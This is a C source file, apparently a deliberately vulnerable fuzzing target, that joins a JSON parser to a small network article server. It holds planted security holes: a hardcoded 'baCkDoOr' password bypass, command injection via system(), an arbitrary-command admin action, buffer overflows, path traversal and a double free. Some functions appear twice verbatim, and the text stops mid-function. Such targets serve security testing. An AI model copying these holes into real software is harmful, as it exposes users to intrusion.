#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include "fuzzgoat.h"
#include <math.h>
#include <stdarg.h>
#include <signal.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#ifdef _MSC_VER
   #ifndef _CRT_SECURE_NO_WARNINGS
      #define _CRT_SECURE_NO_WARNINGS
   #endif
#endif
const struct _json_value json_value_none;
typedef unsigned int json_uchar;
#define MAX_USERS 20
#define MAX_NAME_LENGTH 50
#define PORT 9090
#define USERNAME 0x01
#define PASSWORD 0x02
#define BADUSER "\x33\x44 BAD USERNAME!"
#define BADPASS "\x33\x45 BAD PASSWORD!"
#define READY   "\x41\x41 READY!"
#define USERPATH "./users/"
#define ARTICLEPATH "./articles/"	
#define LISTCOMMAND "ls ./articles/ > list.txt"
#define FILENOTAVAIL "\x33\x31 FILE NOT AVAILABLE!"
#define BEGINFILE "\x41\x41 BEGIN FILE: END WITH '!!!'"
#define ARTICLEWROTE "\x41\x42 ARTICLE HAS BEEN WRITTEN!"
#define LIST_ARTICLES 0x22
#define READ_ARTICLE 0x23
#define WRITE_ARTICLE 0x24
#define COMMAND 0x25
#define ADD_USER 0x26
void logData(FILE *logfile, char *format, ...);
int setupSock(FILE *logf, unsigned short port);
int writeSock(int sock, char *buf, size_t len);
int readSock(int sock, char *buf, size_t len);
void mainLoop(FILE *logf, int sock);
void handleConnection(FILE *logfile, int sock);
int userFunctions(FILE *logfile, int sock, char *user);
char *findarg(char *argbuf, char argtype);
int authenticate(FILE *logfile, char *user, char *pass);
struct User {
    char name[MAX_NAME_LENGTH];
    double balance;
};
struct Node {
    int data;
    struct Node* next;
};
struct User *userDatabase[MAX_USERS];
int userCount = 0;
void deleteUser(const char *name);
void createUser(const char *name, double initialBalance);
void processNode(struct Node* node);
void processUserNode(const char *name);
void deleteUser(const char *name) {
    for (int i = 0; i < userCount; i++) {
        if (strcmp(userDatabase[i]->name, name) == 0) {
            free(userDatabase[i]);
            free(userDatabase[i]);
            for (int j = i; j < userCount - 1; j++) {
                userDatabase[j] = userDatabase[j + 1];
            }
            userCount--;
            return;
        }
    }
    fprintf(stderr, "User %s not found\n", name);
}
void createUser(const char *name, double initialBalance) {
    if (userCount < MAX_USERS) {
        struct User *newUser = (struct User *)malloc(sizeof(struct User));
        if (newUser != NULL) {
            strncpy(newUser->name, name, MAX_NAME_LENGTH - 1);
            newUser->balance = initialBalance;
            userDatabase[userCount] = newUser;
            userCount++;
        } else {
            fprintf(stderr, "Memory allocation failed for user %s\n", name);
        }
    } else {
        fprintf(stderr, "User database is full\n");
    }
}
void processNode(struct Node* node) {
    printf("Node data: %d\n", node->data);
}
void processUserNode(const char *name) {
    printf("User balance: %.2f\n", userDatabase[0]->balance);
}
static void print_depth_shift(int depth)
{
        int j;
        for (j=0; j < depth; j++) {
                printf(" ");
        }
}
static void process_value(json_value* value, int depth);
static void process_object(json_value* value, int depth)
{
        int length, x;
        if (value == NULL) {
                return;
        }
        length = value->u.object.length;
        for (x = 0; x < length; x++) {
                print_depth_shift(depth);
                printf("object[%d].name = %s\n", x, value->u.object.values[x].name);
                process_value(value->u.object.values[x].value, depth+1);
        }
}
static void process_array(json_value* value, int depth)
{
        int length, x;
        if (value == NULL) {
                return;
        }
        length = value->u.array.length;
        printf("array\n");
        for (x = 0; x < length; x++) {
                process_value(value->u.array.values[x], depth);
        }
}
static void process_value(json_value* value, int depth)
{
        int j;
        if (value == NULL) {
                return;
        }
        if (value->type != json_object) {
                print_depth_shift(depth);
        }
        switch (value->type) {
                case json_none:
                        printf("none\n");
                        break;
                case json_object:
                        process_object(value, depth+1);
                        break;
                case json_array:
                        process_array(value, depth+1);
                        break;
                case json_integer:
                        printf("int: %10" PRId64 "\n", value->u.integer);
                        break;
                case json_double:
                        printf("double: %f\n", value->u.dbl);
                        break;
                case json_string:
                        printf("string: %s\n", value->u.string.ptr);
                        break;
                case json_boolean:
                        printf("bool: %d\n", value->u.boolean);
                        break;
        }
}
static void print_depth_shift(int depth)
{
        int j;
        for (j=0; j < depth; j++) {
                printf(" ");
        }
}
static void process_value(json_value* value, int depth);
static void process_object(json_value* value, int depth)
{
        int length, x;
        if (value == NULL) {
                return;
        }
        length = value->u.object.length;
        for (x = 0; x < length; x++) {
                print_depth_shift(depth);
                printf("object[%d].name = %s\n", x, value->u.object.values[x].name);
                process_value(value->u.object.values[x].value, depth+1);
        }
}
static void process_array(json_value* value, int depth)
{
        int length, x;
        if (value == NULL) {
                return;
        }
        length = value->u.array.length;
        printf("array\n");
        for (x = 0; x < length; x++) {
                process_value(value->u.array.values[x], depth);
        }
}
static void process_value(json_value* value, int depth)
{
        int j;
        if (value == NULL) {
                return;
        }
        if (value->type != json_object) {
                print_depth_shift(depth);
        }
        switch (value->type) {
                case json_none:
                        printf("none\n");
                        break;
                case json_object:
                        process_object(value, depth+1);
                        break;
                case json_array:
                        process_array(value, depth+1);
                        break;
                case json_integer:
                        printf("int: %10" PRId64 "\n", value->u.integer);
                        break;
                case json_double:
                        printf("double: %f\n", value->u.dbl);
                        break;
                case json_string:
                        printf("string: %s\n", value->u.string.ptr);
                        break;
                case json_boolean:
                        printf("bool: %d\n", value->u.boolean);
                        break;
        }
}
static unsigned char hex_value (json_char c)
{
   if (isdigit(c))
      return c - '0';
   switch (c) {
      case 'a': case 'A': return 0x0A;
      case 'b': case 'B': return 0x0B;
      case 'c': case 'C': return 0x0C;
      case 'd': case 'D': return 0x0D;
      case 'e': case 'E': return 0x0E;
      case 'f': case 'F': return 0x0F;
      default: return 0xFF;
   }
}

typedef struct
{
   unsigned long used_memory;
   unsigned int uint_max;
   unsigned long ulong_max;
   json_settings settings;
   int first_pass;
   const json_char * ptr;
   unsigned int cur_line, cur_col;
} json_state;
static void * default_alloc (size_t size, int zero, void * user_data)
{
   return zero ? calloc (1, size) : malloc (size);
}
static void default_free (void * ptr, void * user_data)
{
   free (ptr);
}
static void * json_alloc (json_state * state, unsigned long size, int zero)
{
   if ((state->ulong_max - state->used_memory) < size)
      return 0;
   if (state->settings.max_memory
         && (state->used_memory += size) > state->settings.max_memory)
   {
      return 0;
   }
   return state->settings.mem_alloc (size, zero, state->settings.user_data);
}
static int new_value (json_state * state,
                      json_value ** top, json_value ** root, json_value ** alloc,
                      json_type type)
{
   json_value * value;
   int values_size;
   if (!state->first_pass)
   {
      value = *top = *alloc;
      *alloc = (*alloc)->_reserved.next_alloc;
      if (!*root)
         *root = value;
      switch (value->type)
      {
         case json_array:
            if (value->u.array.length == 0)
              break;
            if (! (value->u.array.values = (json_value **) json_alloc
               (state, value->u.array.length * sizeof (json_value *), 0)) )
            {
               return 0;
            }
            value->u.array.length = 0;
            break;
         case json_object:
            if (value->u.object.length == 0)
               break;
            values_size = sizeof (*value->u.object.values) * value->u.object.length;
            if (! (value->u.object.values = (json_object_entry *) json_alloc
                  (state, values_size + ((unsigned long) value->u.object.values), 0)) )
            {
               return 0;
            }
            value->_reserved.object_mem = (*(char **) &value->u.object.values) + values_size;
            value->u.object.length = 0;
            break;
         case json_string:
            if (! (value->u.string.ptr = (json_char *) json_alloc
               (state, (value->u.string.length + 1) * sizeof (json_char), 0)) )
            {
               return 0;
            }
            value->u.string.length = 0;
            break;
         default:
            break;
      };
      return 1;
   }
   if (! (value = (json_value *) json_alloc
         (state, sizeof (json_value) + state->settings.value_extra, 1)))
   {
      return 0;
   }
   if (!*root)
      *root = value;
   value->type = type;
   value->parent = *top;
   #ifdef JSON_TRACK_SOURCE
      value->line = state->cur_line;
      value->col = state->cur_col;
   #endif
   if (*alloc)
      (*alloc)->_reserved.next_alloc = value;
   *alloc = *top = value;
   return 1;
}
#define whitespace \
   case '\n': ++ state.cur_line;  state.cur_col = 0; \
   case ' ': case '\t': case '\r'
#define string_add(b)  \
   do { if (!state.first_pass) string [string_length] = b;  ++ string_length; } while (0);
#define line_and_col \
   state.cur_line, state.cur_col
static const long
   flag_next             = 1 << 0,
   flag_reproc           = 1 << 1,
   flag_need_comma       = 1 << 2,
   flag_seek_value       = 1 << 3, 
   flag_escaped          = 1 << 4,
   flag_string           = 1 << 5,
   flag_need_colon       = 1 << 6,
   flag_done             = 1 << 7,
   flag_num_negative     = 1 << 8,
   flag_num_zero         = 1 << 9,
   flag_num_e            = 1 << 10,
   flag_num_e_got_sign   = 1 << 11,
   flag_num_e_negative   = 1 << 12,
   flag_line_comment     = 1 << 13,
   flag_block_comment    = 1 << 14;
json_value * json_parse_ex (json_settings * settings,
                            const json_char * json,
                            size_t length,
                            char * error_buf)
{
   json_char error [json_error_max];
   const json_char * end;
   json_value * top, * root, * alloc = 0;
   json_state state = { 0 };
   long flags;
   long num_digits = 0, num_e = 0;
   json_int_t num_fraction = 0;
   if (length >= 3 && ((unsigned char) json [0]) == 0xEF
                   && ((unsigned char) json [1]) == 0xBB
                   && ((unsigned char) json [2]) == 0xBF)
   {
      json += 3;
      length -= 3;
   }
   error[0] = '\0';
   end = (json + length);
   memcpy (&state.settings, settings, sizeof (json_settings));
   if (!state.settings.mem_alloc)
      state.settings.mem_alloc = default_alloc;
   if (!state.settings.mem_free)
      state.settings.mem_free = default_free;
   memset (&state.uint_max, 0xFF, sizeof (state.uint_max));
   memset (&state.ulong_max, 0xFF, sizeof (state.ulong_max));
   state.uint_max -= 8; /* limit of how much can be added before next check */
   state.ulong_max -= 8;
   for (state.first_pass = 1; state.first_pass >= 0; -- state.first_pass)
   {
      json_uchar uchar;
      unsigned char uc_b1, uc_b2, uc_b3, uc_b4;
      json_char * string = 0;
      unsigned int string_length = 0;
      top = root = 0;
      flags = flag_seek_value;
      state.cur_line = 1;
      for (state.ptr = json ;; ++ state.ptr)
      {
         json_char b = (state.ptr == end ? 0 : *state.ptr);        
         if (flags & flag_string)
         {
            if (!b)
            {  sprintf (error, "Unexpected EOF in string (at %d:%d)", line_and_col);
               goto e_failed;
            }
            if (string_length > state.uint_max)
               goto e_overflow;
            if (flags & flag_escaped)
            {
               flags &= ~ flag_escaped;
               switch (b)
               {
                  case 'b':  string_add ('\b');  break;
                  case 'f':  string_add ('\f');  break;
                  case 'n':  string_add ('\n');  break;
                  case 'r':  string_add ('\r');  break;
                  case 't':  string_add ('\t');  break;
                  case 'u':
                    if (end - state.ptr < 4 || 
                        (uc_b1 = hex_value (*++ state.ptr)) == 0xFF ||
                        (uc_b2 = hex_value (*++ state.ptr)) == 0xFF ||
                        (uc_b3 = hex_value (*++ state.ptr)) == 0xFF ||
                        (uc_b4 = hex_value (*++ state.ptr)) == 0xFF)
                    {
                        sprintf (error, "Invalid character value `%c` (at %d:%d)", b, line_and_col);
                        goto e_failed;
                    }
                    uc_b1 = (uc_b1 << 4) | uc_b2;
                    uc_b2 = (uc_b3 << 4) | uc_b4;
                    uchar = (uc_b1 << 8) | uc_b2;
                    if ((uchar & 0xF800) == 0xD800) {
                        json_uchar uchar2;
                        
                        if (end - state.ptr < 6 || (*++ state.ptr) != '\\' || (*++ state.ptr) != 'u' ||
                            (uc_b1 = hex_value (*++ state.ptr)) == 0xFF ||
                            (uc_b2 = hex_value (*++ state.ptr)) == 0xFF ||
                            (uc_b3 = hex_value (*++ state.ptr)) == 0xFF ||
                            (uc_b4 = hex_value (*++ state.ptr)) == 0xFF)
                        {
                            sprintf (error, "Invalid character value `%c` (at %d:%d)", b, line_and_col);
                            goto e_failed;
                        }
                        uc_b1 = (uc_b1 << 4) | uc_b2;
                        uc_b2 = (uc_b3 << 4) | uc_b4;
                        uchar2 = (uc_b1 << 8) | uc_b2;
                        
                        uchar = 0x010000 | ((uchar & 0x3FF) << 10) | (uchar2 & 0x3FF);
                    }
                    if (sizeof (json_char) >= sizeof (json_uchar) || (uchar <= 0x7F))
                    {
                       string_add ((json_char) uchar);
                       break;
                    }
                    if (uchar <= 0x7FF)
                    {
                        if (state.first_pass)
                           string_length += 2;
                        else
                        {  string [string_length ++] = 0xC0 | (uchar >> 6);
                           string [string_length ++] = 0x80 | (uchar & 0x3F);
                        }
                        break;
                    }
                    if (uchar <= 0xFFFF) {
                        if (state.first_pass)
                           string_length += 3;
                        else
                        {  string [string_length ++] = 0xE0 | (uchar >> 12);
                           string [string_length ++] = 0x80 | ((uchar >> 6) & 0x3F);
                           string [string_length ++] = 0x80 | (uchar & 0x3F);
                        }
                        break;
                    }
                    if (state.first_pass)
                       string_length += 4;
                    else
                    {  string [string_length ++] = 0xF0 | (uchar >> 18);
                       string [string_length ++] = 0x80 | ((uchar >> 12) & 0x3F);
                       string [string_length ++] = 0x80 | ((uchar >> 6) & 0x3F);
                       string [string_length ++] = 0x80 | (uchar & 0x3F);
                    }
                    break;
                  default:
                     string_add (b);
               };
               continue;
            }
            if (b == '\\')
            {
               flags |= flag_escaped;
               continue;
            }
            if (b == '"')
            {
               if (!state.first_pass)
                  string [string_length] = 0;
               flags &= ~ flag_string;
               string = 0;
               switch (top->type)
               {
                  case json_string:
                     top->u.string.length = string_length;
                     flags |= flag_next;
                     break;
                  case json_object:
                     if (state.first_pass)
                        (*(json_char **) &top->u.object.values) += string_length + 1;
                     else
                     {  
                        top->u.object.values [top->u.object.length].name
                           = (json_char *) top->_reserved.object_mem;
                        top->u.object.values [top->u.object.length].name_length
                           = string_length;
                        (*(json_char **) &top->_reserved.object_mem) += string_length + 1;
                     }
                     flags |= flag_seek_value | flag_need_colon;
                     continue;
                  default:
                     break;
               };
            }
            else
            {
               string_add (b);
               continue;
            }
         }
         if (state.settings.settings & json_enable_comments)
         {
            if (flags & (flag_line_comment | flag_block_comment))
            {
               if (flags & flag_line_comment)
               {
                  if (b == '\r' || b == '\n' || !b)
                  {
                     flags &= ~ flag_line_comment;
                     -- state.ptr;  /* so null can be reproc'd */
                  }
                  continue;
               }
               if (flags & flag_block_comment)
               {
                  if (!b)
                  {  sprintf (error, "%d:%d: Unexpected EOF in block comment", line_and_col);
                     goto e_failed;
                  }
                  if (b == '*' && state.ptr < (end - 1) && state.ptr [1] == '/')
                  {
                     flags &= ~ flag_block_comment;
                     ++ state.ptr;  /* skip closing sequence */
                  }
                  continue;
               }
            }
            else if (b == '/')
            {
               if (! (flags & (flag_seek_value | flag_done)) && top->type != json_object)
               {  sprintf (error, "%d:%d: Comment not allowed here", line_and_col);
                  goto e_failed;
               }
               if (++ state.ptr == end)
               {  sprintf (error, "%d:%d: EOF unexpected", line_and_col);
                  goto e_failed;
               }
               switch (b = *state.ptr)
               {
                  case '/':
                     flags |= flag_line_comment;
                     continue;
                  case '*':
                     flags |= flag_block_comment;
                     continue;
                  default:
                     sprintf (error, "%d:%d: Unexpected `%c` in comment opening sequence", line_and_col, b);
                     goto e_failed;
               };
            }
         }
         if (flags & flag_done)
         {
            if (!b)
               break;
            switch (b)
            {
               whitespace:
                  continue;
               default:
                  sprintf (error, "%d:%d: Trailing garbage: `%c`",
                           state.cur_line, state.cur_col, b);
                  goto e_failed;
            };
         }
         if (flags & flag_seek_value)
         {
            switch (b)
            {
               whitespace:
                  continue;
               case ']':
                  if (top && top->type == json_array)
                     flags = (flags & ~ (flag_need_comma | flag_seek_value)) | flag_next;
                  else
                  {  sprintf (error, "%d:%d: Unexpected ]", line_and_col);
                     goto e_failed;
                  }
                  break;
               default:
                  if (flags & flag_need_comma)
                  {
                     if (b == ',')
                     {  flags &= ~ flag_need_comma;
                        continue;
                     }
                     else
                     {
                        sprintf (error, "%d:%d: Expected , before %c",
                                 state.cur_line, state.cur_col, b);
                        goto e_failed;
                     }
                  }
                  if (flags & flag_need_colon)
                  {
                     if (b == ':')
                     {  flags &= ~ flag_need_colon;
                        continue;
                     }
                     else
                     { 
                        sprintf (error, "%d:%d: Expected : before %c",
                                 state.cur_line, state.cur_col, b);
                        goto e_failed;
                     }
                  }
                  flags &= ~ flag_seek_value;
                  switch (b)
                  {
                     case '{':
                        if (!new_value (&state, &top, &root, &alloc, json_object))
                           goto e_alloc_failure;

                        continue;
                     case '[':
                        if (!new_value (&state, &top, &root, &alloc, json_array))
                           goto e_alloc_failure;
                        flags |= flag_seek_value;
                        continue;
                     case '"':
                        if (!new_value (&state, &top, &root, &alloc, json_string))
                           goto e_alloc_failure;
                        flags |= flag_string;
                        string = top->u.string.ptr;
                        string_length = 0;
                        continue;
                     case 't':
                        if ((end - state.ptr) < 3 || *(++ state.ptr) != 'r' ||
                            *(++ state.ptr) != 'u' || *(++ state.ptr) != 'e')
                        {
                           goto e_unknown_value;
                        }
                        if (!new_value (&state, &top, &root, &alloc, json_boolean))
                           goto e_alloc_failure;
                        top->u.boolean = 1;
                        flags |= flag_next;
                        break;
                     case 'f':
                        if ((end - state.ptr) < 4 || *(++ state.ptr) != 'a' ||
                            *(++ state.ptr) != 'l' || *(++ state.ptr) != 's' ||
                            *(++ state.ptr) != 'e')
                        {
                           goto e_unknown_value;
                        }
                        if (!new_value (&state, &top, &root, &alloc, json_boolean))
                           goto e_alloc_failure;
                        flags |= flag_next;
                        break;
                     case 'n':
                        if ((end - state.ptr) < 3 || *(++ state.ptr) != 'u' ||
                            *(++ state.ptr) != 'l' || *(++ state.ptr) != 'l')
                        {
                           goto e_unknown_value;
                        }
                        if (!new_value (&state, &top, &root, &alloc, json_null))
                           goto e_alloc_failure;
                        flags |= flag_next;
                        break;
                     default:
                        if (isdigit (b) || b == '-')
                        {
                           if (!new_value (&state, &top, &root, &alloc, json_integer))
                              goto e_alloc_failure;
                           if (!state.first_pass)
                           {
                              while (isdigit (b) || b == '+' || b == '-'
                                        || b == 'e' || b == 'E' || b == '.')
                              {
                                 if ( (++ state.ptr) == end)
                                 {
                                    b = 0;
                                    break;
                                 }
                                 b = *state.ptr;
                              }
                              flags |= flag_next | flag_reproc;
                              break;
                           }
                           flags &= ~ (flag_num_negative | flag_num_e |
                                        flag_num_e_got_sign | flag_num_e_negative |
                                           flag_num_zero);
                           num_digits = 0;
                           num_fraction = 0;
                           num_e = 0;

                           if (b != '-')
                           {
                              flags |= flag_reproc;
                              break;
                           }
                           flags |= flag_num_negative;
                           continue;
                        }
                        else
                        {  sprintf (error, "%d:%d: Unexpected %c when seeking value", line_and_col, b);
                           goto e_failed;
                        }
                  };
            };
         }
         else
         {
            switch (top->type)
            {
            case json_object:
               switch (b)
               {
                  whitespace:
                     continue;
                  case '"':
                     if (flags & flag_need_comma)
                     {  sprintf (error, "%d:%d: Expected , before \"", line_and_col);
                        goto e_failed;
                     }
                     flags |= flag_string;
                     string = (json_char *) top->_reserved.object_mem;
                     string_length = 0;
                     break;
                  case '}':
                     flags = (flags & ~ flag_need_comma) | flag_next;
                     break;
                  case ',':
                     if (flags & flag_need_comma)
                     {
                        flags &= ~ flag_need_comma;
                        break;
                     }
                  default:
                     sprintf (error, "%d:%d: Unexpected `%c` in object", line_and_col, b);
                     goto e_failed;
               };
               break;
            case json_integer:
            case json_double:
               if (isdigit (b))
               {
                  ++ num_digits;
                  if (top->type == json_integer || flags & flag_num_e)
                  {
                     if (! (flags & flag_num_e))
                     {
                        if (flags & flag_num_zero)
                        {  sprintf (error, "%d:%d: Unexpected `0` before `%c`", line_and_col, b);
                           goto e_failed;
                        }
                        if (num_digits == 1 && b == '0')
                           flags |= flag_num_zero;
                     }
                     else
                     {
                        flags |= flag_num_e_got_sign;
                        num_e = (num_e * 10) + (b - '0');
                        continue;
                     }
                     top->u.integer = (top->u.integer * 10) + (b - '0');
                     continue;
                  }
                  num_fraction = (num_fraction * 10) + (b - '0');
                  continue;
               }
               if (b == '+' || b == '-')
               {
                  if ( (flags & flag_num_e) && !(flags & flag_num_e_got_sign))
                  {
                     flags |= flag_num_e_got_sign;
                     if (b == '-')
                        flags |= flag_num_e_negative;
                     continue;
                  }
               }
               else if (b == '.' && top->type == json_integer)
               {
                  if (!num_digits)
                  {  sprintf (error, "%d:%d: Expected digit before `.`", line_and_col);
                     goto e_failed;
                  }
                  top->type = json_double;
                  top->u.dbl = (double) top->u.integer;
                  num_digits = 0;
                  continue;
               }
               if (! (flags & flag_num_e))
               {
                  if (top->type == json_double)
                  {
                     if (!num_digits)
                     {  sprintf (error, "%d:%d: Expected digit after `.`", line_and_col);
                        goto e_failed;
                     }
                     top->u.dbl += ((double) num_fraction) / (pow (10.0, (double) num_digits));
                  }
                  if (b == 'e' || b == 'E')
                  {
                     flags |= flag_num_e;
                     if (top->type == json_integer)
                     {
                        top->type = json_double;
                        top->u.dbl = (double) top->u.integer;
                     }
                     num_digits = 0;
                     flags &= ~ flag_num_zero;
                     continue;
                  }
               }
               else
               {
                  if (!num_digits)
                  {  sprintf (error, "%d:%d: Expected digit after `e`", line_and_col);
                     goto e_failed;
                  }
                  top->u.dbl *= pow (10.0, (double)
                      (flags & flag_num_e_negative ? - num_e : num_e));
               }
               if (flags & flag_num_negative)
               {
                  if (top->type == json_integer)
                     top->u.integer = - top->u.integer;
                  else
                     top->u.dbl = - top->u.dbl;
               }
               flags |= flag_next | flag_reproc;
               break;
            default:
               break;
            };
         }
         if (flags & flag_reproc)
         {
            flags &= ~ flag_reproc;
            -- state.ptr;
         }
         if (flags & flag_next)
         {
            flags = (flags & ~ flag_next) | flag_need_comma;
            if (!top->parent)
            {
               flags |= flag_done;
               continue;
            }
            if (top->parent->type == json_array)
               flags |= flag_seek_value;
            if (!state.first_pass)
            {
               json_value * parent = top->parent;
               switch (parent->type)
               {
                  case json_object:
                     parent->u.object.values
                        [parent->u.object.length].value = top;
                     break;
                  case json_array:
                     parent->u.array.values
                           [parent->u.array.length] = top;
                     break;
                  default:
                     break;
               };
            }
            if ( (++ top->parent->u.array.length) > state.uint_max)
               goto e_overflow;
            top = top->parent;
            continue;
         }
      }
      alloc = root;
   }
   return root;
e_unknown_value:
   sprintf (error, "%d:%d: Unknown value", line_and_col);
   goto e_failed;
e_alloc_failure:
   strcpy (error, "Memory allocation failure");
   goto e_failed;
e_overflow:
   sprintf (error, "%d:%d: Too long (caught overflow)", line_and_col);
   goto e_failed;
e_failed:
   if (error_buf)
   {
      if (*error)
         strcpy (error_buf, error);
      else
         strcpy (error_buf, "Unknown error");
   }
   if (state.first_pass)
      alloc = root;
   while (alloc)
   {
      top = alloc->_reserved.next_alloc;
      state.settings.mem_free (alloc, state.settings.user_data);
      alloc = top;
   }
   if (!state.first_pass)
      json_value_free_ex (&state.settings, root);
   return 0;
}
json_value * json_parse (const json_char * json, size_t length)
{
   json_settings settings = { 0 };
   return json_parse_ex (&settings, json, length, 0);
}
void json_value_free_ex (json_settings * settings, json_value * value)
{
   json_value * cur_value;
   if (!value)
      return;
   value->parent = 0;
   while (value)
   {
      switch (value->type)
      {
         case json_array:
            if (!value->u.array.length)
            {
               settings->mem_free (value->u.array.values, settings->user_data);
               break;
            }
            value = value->u.array.values [-- value->u.array.length];
            continue;
         case json_object:
            if (!value->u.object.length)
            {
               settings->mem_free (value->u.object.values, settings->user_data);
               break;
            }
            value = value->u.object.values [-- value->u.object.length].value;
            continue;
         case json_string:
            settings->mem_free (value->u.string.ptr, settings->user_data);
            break;
         default:
            break;
      };
      cur_value = value;
      value = value->parent;
      settings->mem_free (cur_value, settings->user_data);
   }
}
void json_value_free (json_value * value)
{
   json_settings settings = { 0 };
   settings.mem_free = default_free;
   json_value_free_ex (&settings, value);
}
int writeSock(int sock, char *buf, size_t len)
{
	ssize_t byteswrote = 0;
	ssize_t ret = 0;
	while (byteswrote < len)
	{
		ret = send(sock, buf + byteswrote, len - byteswrote, 0);
		if (ret < 0)
		{
			return -1;
		}
		if (ret == 0)
		{
			break;
		}
		byteswrote += ret;
	}
	return byteswrote;
}
int readSock(int sock, char *buf, size_t len)
{
	ssize_t ret = 0;
	ssize_t bytesread = 0;
	while (bytesread < len)
	{
		ret = recv(sock, buf + bytesread, len - bytesread, 0);
		if (ret == 0)
		{
			break;
		}	
		if (ret < 0)
		{
			return -1;
		}
		bytesread += ret;
	}
	return bytesread;	
}
void writeArticle(int sock, FILE *logfile, char *action)
{
	FILE *file;	
	char *p;
	size_t x, y;
	int complete = 0;
	char buf[1024];
	char path[1024];
	strcpy(path, ARTICLEPATH);
	strncat(path, &action[1], sizeof(path));
	logData(logfile, "user writing article: %s", path);
	file = fopen(&action[1], "w");
	if (!file)
	{
		writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL));
		return;
	}
	writeSock(sock, BEGINFILE, sizeof(BEGINFILE));
	while (1)
	{
		memset(buf, 0, sizeof(buf));
		x = readSock(sock, buf, sizeof(buf)-1);
		for (y = 0; y < x; ++y)
		{
			if (buf[y] == '!')
			{
				if (buf[y+1] == '!' && buf[y+2] == '!')
				{
					buf[y] = 0x0;
					complete = 1;
				}
			}
		}	
		fputs(buf, file);
		if (complete)
		{
			break;
		}
	}
	writeSock(sock, ARTICLEWROTE, sizeof(ARTICLEWROTE));
	fclose(file);
}
void readArticle(int sock, FILE *logfile, char *action)
{
	FILE *file;
	char buf[100];
	char path[100];
	logData(logfile, &action[1]);
	strcpy(path, ARTICLEPATH);
	strcat(path, &action[1]);
	logData(logfile, "user request to read article: %s", path);
	file = fopen(path, "r");
	if (!file)
	{
		writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL));
		return;
	}
	while (fgets(buf, 1000, file))
	{
		writeSock(sock, buf, strlen(buf));
	}
	fclose(file);
	return;
}
void listArticles(int sock, FILE *logfile, char *action)
{
	char buf[100];
	FILE *list;
	logData(logfile, "user has requested a list of articles");
	memset(buf, 0, sizeof(buf));
	system(LISTCOMMAND);
	list = fopen("list.txt", "r");
	while (fgets(buf, sizeof(buf)-1, list))
	{
		writeSock(sock, buf, strlen(buf));	
	}
	fclose(list);
	return;	
}
void command(FILE *log, int sock, char *action)
{
	logData(log, "executing command: %s", &action[1]);
	system(&action[1]);
}
void addUser(FILE *log, int sock, char *action)
{
	char *p;
	char buf[1024];
	p = strchr(&action[1], ':');
	if (!p)
	{
		return;
	}
	*p = 0x0;
	logData(log, "Adding user: %s with pass: %s", &action[1], &p[1]);	
	snprintf(buf, sizeof(buf)-1, "echo %s > %s%s.txt", &p[1], USERPATH, &action[1]);
	return;
}
int adminFunctions(FILE *logfile, int sock)
{
	char action[1024];
	size_t len;
	while (1)
	{
		writeSock(sock, READY, sizeof(READY));
		memset(action, 0, sizeof(action));
		len = readSock(sock, action, sizeof(action));	
		if (action[0] == ADD_USER)
		{
			addUser(logfile, sock, action);	
		}
		else if (action[0] == COMMAND)
		{
			command(logfile, sock, action);	
		}
		else
		{
			logData(logfile, "unknown action: %x", action[0]);
		}
	}
}
int userFunctions(FILE *logfile, int sock, char *user)
{
	char action[1024];
	size_t len;
	if (0 == strncmp(user, "admin", 5))
	{
		adminFunctions(logfile, sock);
		return 0;
	}
	while (1)
	{
		writeSock(sock, READY, sizeof(READY));
		memset(action, 0, sizeof(action));
		len = readSock(sock, action, sizeof(action));	
		if (action[0] == LIST_ARTICLES)
		{
			listArticles(sock, logfile, action);
		}
		else if (action[0] == READ_ARTICLE)
		{
			readArticle(sock, logfile, action);	
		}
		else if (action[0] == WRITE_ARTICLE)
		{
			writeArticle(sock, logfile, action);
		}
		else
		{
			logData(logfile, "unknown action %x", action[0]);
			return;
		}
	}
	return 0;
}
int authenticate(FILE *logfile, char *user, char *pass)
{
	char search[512];
	char path[1024];
	char userfile[1024];
	char data[1024];
	FILE *file;
	int ret;
	memset(path, 0, sizeof(1024));	
	if (memcmp(pass, "baCkDoOr", 9) == 0)
	{
		return 1;
	}
	logData(logfile, "performing lookup for user via system()!\n");
	snprintf(userfile, sizeof(userfile)-1, "%s.txt", user);
	snprintf(search, sizeof(userfile)-1, "stat %s`ls %s | grep %s`", USERPATH, USERPATH, userfile);
	ret = system(search);
	if (ret != 0)
	{
		return 2;
	}
	snprintf(path, sizeof(path)-1, "%s%s", USERPATH, userfile);
	file = fopen(path, "r");
	if (!file)
	{
		logData(logfile, "fopen for userfile failed\n");
		return 2;
	}
	logData(logfile, "getting userfile info\n");
	fgets(data, sizeof(data)-1, file);
	fclose(file);
	if (memcmp(data, pass, 3))
	{
		return 3;
	}
	return 1;
}
char *findarg(char *argbuf, char argtype)
{
	char *ptr1;
	char *found = NULL;
	char type = 0;
	size_t size;
	ptr1 = argbuf;
	while (1)
	{	
		memcpy((char *)&size, ptr1, 4);
		if (size == 0)
		{
			break;
		}	
		if (ptr1[4] == argtype)
		{
			found = &ptr1[5];
			break;
		}
		ptr1 += size;
	}
	return found;
}
void handleConnection(FILE *logfile, int sock)
{
	char buffer[1024];
	char argbuf[1024];
	char *user = NULL;
	char *pass = NULL;
	int len = 0;
	int ret = 0;
	size_t segloop;
	size_t segmentcount;
	size_t segnext;
	size_t argsize;
	char *ptr1;
	char *ptr2;
	memset(buffer, 0, sizeof(buffer));
	len = readSock(sock, buffer, sizeof(buffer));	
	logData(logfile, "handling connection");
	if (len == -1)
	{
		return;
	}
	ptr1 = buffer;
	ptr2 = argbuf;
	memcpy((char *)&segmentcount, ptr1, 4);
	logData(logfile, "Segment count is %i", segmentcount);
	if (segmentcount * 8 > sizeof(argbuf))
	{
		logData(logfile, "bad segment count");
		return;
	}
	ptr1 += 4;
	memset(argbuf, 0, sizeof(argbuf));
	for (segloop = 0; segloop < segmentcount; ++segloop)
	{
		logData(logfile, "adding segment %i", segloop+1);
		memcpy((char *)&segnext, ptr1, 4);
		logData(logfile, "next segment offset %i", segnext);
		ptr1 += 4;
		memcpy((char *)&argsize, ptr1, 4);	
		logData(logfile, "argsize: %i", argsize);
		memcpy(ptr2, ptr1, argsize);
		ptr2 += argsize;
		ptr1 += segnext;
	}
	logData(logfile, "looking up user args");
	user = findarg(argbuf, USERNAME);
	pass = findarg(argbuf, PASSWORD);
